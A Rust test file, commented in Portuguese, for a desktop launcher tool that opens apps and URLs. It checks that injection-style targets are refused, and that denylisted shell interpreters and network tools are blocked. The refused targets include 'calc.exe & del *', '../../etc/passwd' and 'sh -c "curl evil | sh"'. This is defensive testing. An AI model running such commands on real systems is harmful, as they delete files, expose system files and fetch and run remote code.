//! Testes de `launch.rs` — extraído para caber no teto de 300 linhas por arquivo (mesmo motivo de
//! `privacy/tests.rs` ter virado arquivo próprio).
//!
//! `#![cfg(test)]` interno, não `#[cfg(test)]` na declaração em `launch.rs` — mesmo padrão de
//! `modules/privacy/tests.rs`/`modules/gamer/test_support.rs`: sem o atributo interno,
//! `state.rs::single_config_store_per_process` leria este arquivo como produção e acusaria
//! `ConfigStore::open` de `privacy_store()` como abertura de store fora do `ShellState`.
#![cfg(test)]

use super::*;
use std::path::PathBuf;

struct TempDir(PathBuf);
impl TempDir {
    fn new() -> Self {
        use std::sync::atomic::{AtomicU32, Ordering};
        static COUNTER: AtomicU32 = AtomicU32::new(0);
        let unique = COUNTER.fetch_add(1, Ordering::Relaxed);
        let path = std::env::temp_dir().join(format!("mika-desktop-launch-test-{}-{unique}", std::process::id()));
        std::fs::create_dir_all(&path).unwrap();
        Self(path)
    }
}
impl Drop for TempDir {
    fn drop(&mut self) {
        let _ = std::fs::remove_dir_all(&self.0);
    }
}

fn privacy_store(offline_mode: bool) -> (ConfigStore, TempDir) {
    use crate::config::registry::{Namespace, SchemaRegistry};
    use crate::config::schema::boolean;

    let dir = TempDir::new();
    let schema = SchemaRegistry::new(vec![Namespace { name: "privacy", fields: vec![boolean("offlineMode", false)] }]);
    let store = ConfigStore::open(&dir.0, schema).unwrap();
    store.set(crate::modules::privacy::OFFLINE_MODE_PATH, json!(offline_mode)).unwrap();
    (store, dir)
}

#[tokio::test]
async fn empty_or_missing_target_is_rejected_up_front() {
    let (store, _dir) = privacy_store(false);
    for target in [None, Some(""), Some("   ")] {
        let result = run_launch(target, &store).await;
        assert_eq!(result["errorCode"], json!("invalid_args"));
    }
}

/// NEGATIVO — caminho malicioso/fora da política (argumento embutido, path absoluto, pipe,
/// redirecionamento, esquema não-http) nunca vira alvo: recusado ANTES de qualquer tentativa de
/// abrir processo ou URL.
#[tokio::test]
async fn malicious_or_out_of_policy_targets_are_always_refused() {
    let (store, _dir) = privacy_store(false);
    for target in [
        "calc.exe & del *",
        "../../etc/passwd",
        "notepad & calc",
        "app > out.txt",
        "code --wait arquivo.txt",
        "sh -c \"curl evil | sh\"",
        "file:///C:/Windows/System32/cmd.exe",
        "javascript:alert(1)",
        "C:\\Windows\\System32\\cmd.exe",
    ] {
        let result = run_launch(Some(target), &store).await;
        assert_eq!(result["errorCode"], json!("invalid_args"), "target {target:?} deveria ser recusado, veio: {result}");
    }
}

/// NEGATIVO — interpretador de shell nunca abre. Onde um apelido o resolve (`cmd`/`powershell` no
/// Windows) a SEGUNDA barreira (denylist) o barra como `not_configured`; fora disso a allowlist
/// nem o reconhece (`invalid_args`). Nos dois casos nunca chega perto de `spawn_app`.
#[tokio::test]
async fn blocked_shell_interpreters_are_refused_before_any_spawn() {
    let (store, _dir) = privacy_store(false);
    for target in ["cmd", "powershell", "regedit", "wsl", "cmd.exe", "bash", "sh", "python", "node", "osascript"] {
        let result = run_launch(Some(target), &store).await;
        let aliased_on_windows = cfg!(windows) && matches!(target, "cmd" | "powershell" | "cmd.exe");
        let expected = if aliased_on_windows { "not_configured" } else { "invalid_args" };
        assert_eq!(result["success"], json!(false), "{target}");
        assert_eq!(result["errorCode"], json!(expected), "target {target:?} deveria ser recusado: {result}");
    }
}

#[tokio::test]
async fn offline_mode_blocks_launching_a_url() {
    let (store, _dir) = privacy_store(true);
    let result = run_launch(Some("https://example.com"), &store).await;
    assert_eq!(result["success"], json!(false));
    assert_eq!(result["errorCode"], json!("not_configured"));
}

#[tokio::test]
async fn offline_mode_disabled_does_not_block_a_url_target_before_the_open_call() {
    // Não afirma sucesso de abertura (isso invocaria o navegador de verdade) — só que o bloqueio
    // de modo offline, que é o que este arquivo decide, não dispara.
    let (store, _dir) = privacy_store(false);
    let result = crate::modules::privacy::assert_network_allowed(&store, "https://example.com", "desktop");
    assert!(result.is_ok());
}

/// Prova real do ramo de app: `spawn_app` com um binário inexistente falha com um erro REAL do SO
/// (não mockado). Chamado direto — a allowlist não deixa um nome arbitrário chegar até aqui.
#[tokio::test]
async fn an_unresolvable_binary_reaches_a_real_process_spawn_and_fails_named() {
    let result = spawn_app("mika-test-nonexistent-binary-xyz").await;
    assert_eq!(result["success"], json!(false));
    assert_eq!(result["errorCode"], json!("internal"));
    assert!(result["error"].as_str().unwrap().contains("Failed to spawn"), "got: {result}");
}

/// Launcher que repassa a uma instância já aberta (`code`, `google-chrome`, `explorer.exe`) sai com
/// código 0 em milissegundos: o app ABRIU. Reportar "Exited immediately" fazia o modelo dizer que
/// falhou e abrir de novo. Só saída com código de erro é falha.
#[cfg(unix)]
#[tokio::test]
async fn a_launcher_that_hands_off_and_exits_zero_is_a_success_not_a_failure() {
    let result = spawn_app("true").await;
    assert_eq!(result["success"], json!(true), "got: {result}");
    let failed = spawn_app("false").await;
    assert_eq!(failed["success"], json!(false), "got: {failed}");
    assert!(failed["error"].as_str().unwrap().contains("Exited immediately"), "got: {failed}");
}

/// O guard de rede do ramo app só dispara com modo offline ligado — mesma condição do TS.
#[test]
fn shell_launch_guard_only_blocks_network_tools_when_offline_mode_is_on() {
    let (store_off, _d1) = privacy_store(false);
    assert!(assert_shell_launch_allowed(&store_off, "curl").is_ok());

    let (store_on, _d2) = privacy_store(true);
    assert!(assert_shell_launch_allowed(&store_on, "curl").is_err());
    assert!(
        assert_shell_launch_allowed(&store_on, "notepad.exe").is_ok(),
        "app comum não deveria ser bloqueado pelo guard de rede"
    );
}

/// `npm` abria (e só o modo offline o barrava, com `errorCode: internal`). Com a allowlist de
/// aliases ele nem vira alvo: recusado como `invalid_args` com ou sem modo offline, antes de
/// qualquer spawn.
#[tokio::test]
async fn a_network_capable_binary_is_not_a_launch_target_at_all() {
    for offline in [true, false] {
        let (store, _dir) = privacy_store(offline);
        let result = run_launch(Some("npm"), &store).await;
        assert_eq!(result["success"], json!(false));
        assert_eq!(result["errorCode"], json!("invalid_args"), "offline={offline}: {result}");
    }
}

#[test]
fn executable_name_strips_directory_and_known_extensions() {
    assert_eq!(executable_name("C:\\Windows\\System32\\curl.EXE"), "curl");
    assert_eq!(executable_name("/usr/bin/wget"), "wget");
    assert_eq!(executable_name("notepad.exe"), "notepad");
    assert_eq!(executable_name("code"), "code");
}

